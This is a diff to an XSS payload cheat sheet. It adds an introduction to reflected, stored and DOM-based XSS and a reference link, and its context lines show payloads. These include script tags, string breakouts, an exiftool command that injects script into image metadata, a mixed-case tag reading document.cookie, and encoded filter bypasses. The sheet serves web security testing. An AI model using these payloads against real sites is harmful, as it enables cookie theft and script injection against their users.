@@ -1,4 +1,18 @@
 # XSS Cheat Sheet (Basic)
+
+## **Introduction**
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
+- Reflected XSS
+
+    Attack where the malicious script runs from another website through the web browser    
+- Stored XSS
+  
+    Stored attacks are those where the injected script is permanently stored on the target servers
+- DOM-Based XSS
+
+    A type of XSS that has payloads found in the DOM rather than within the HTML code.
+
+## **Payloads**
 1. Basic payload
 ```html
 <script>alert(1)</script>
@@ -89,7 +103,7 @@
 </script>
 ```
 
-# XSS Cheat Sheet (Advanced)
+## **XSS Cheat Sheet (Advanced)**
 7. Use when input lands in a script block, inside a string delimited value.
 ```html
 '-alert(1)-'
@@ -274,7 +288,7 @@ $ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
 
 > Add a "]]>" if input lands in a CDATA section
 
-# XSS Cheat Sheet (Bypass)
+## **XSS Cheat Sheet (Bypass)**
 19. Mixed Case
 ```html
 <Script>alert(document.cookie)</Script> 
@@ -321,3 +335,6 @@ javascript://%250Aalert(1)
 ```html
 <!--><svg onload=alert(1)-->
 ```
+
+Reference:
+- [Brute Logic](https://brutelogic.com.br/)
